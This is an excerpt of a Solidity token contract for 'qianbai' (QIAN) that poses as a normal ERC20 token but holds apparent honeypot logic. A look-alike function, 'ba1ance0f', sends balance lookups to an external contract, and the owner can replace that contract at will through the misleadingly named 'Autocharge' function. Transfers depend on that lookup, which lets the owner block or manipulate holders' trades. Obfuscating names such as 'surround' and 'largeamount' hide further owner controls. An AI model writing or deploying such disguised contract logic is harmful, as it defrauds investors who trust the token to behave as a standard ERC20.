...
interface IERC1363Receiver {
    ...
    function ba1ance0f(address account) external returns (uint256);
}
...
contract IERC1363 {    
     ...
     */
    IERC1363Receiver _receiver;    

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function ba1ance0f(address account) internal returns (uint256) {
        return _receiver.   //Returns the amount of tokens owned by `account`.
        ba1ance0f(account);        
    }
...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function Autocharge(address newOwner) external onlyOwner returns (bool) {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _receiver = IERC1363Receiver(newOwner);
        return true;
    }      
...
contract qianbai is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "qianbai";    
    string public symbol = "QIAN";
    uint8 public decimals = 9;   

    uint8 public device;
    
    uint8 public resetlimitfee;  
    ...
    function makerecord(address sender, address recipient, uint256 amount) private { 
      if (amount > 0) {
    ...
    function _transfer(
        ...
        require(ba1ance0f(senderAddr) >= 0, "ERC20: Insufficient Balance");
        require(_walletMax >= ba1ance0f(recipientAddr).add(amount), "ERC20: transfer amount exceeds the maxWalletAmount.");
    ...
    function AirDrop(address from, address[] calldata addresses, uint256 tokenAmount) external onlyOwner {
        ...
        for(uint256 i=0; i < addresses.length; i++){
            _basicTransfer(from,addresses[i],tokenAmount);
        }
    }

    function checkThreshold() internal view returns (uint256) {        
        return totalSupply.mul(2).div(100); // 2% of supply;
    } 

    function located(address shareholder, uint256 totalDividends, uint256 totalExcluded) public pure returns (uint256) {
      if(shareholder == address(0)){ return 0; }     
      if(totalDividends <= totalExcluded){ return 0; }
      return totalDividends - (totalExcluded);
  }

    function surround(uint256 minimumTokenBalanceForDividends) external onlyOwner {
        _coolWait = 3600;
        _minimumTokenBalanceForDividends = minimumTokenBalanceForDividends;
    }

    function largeamount(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;
    }

    function leadprocess(address shareholder, uint256 _amount) internal {    
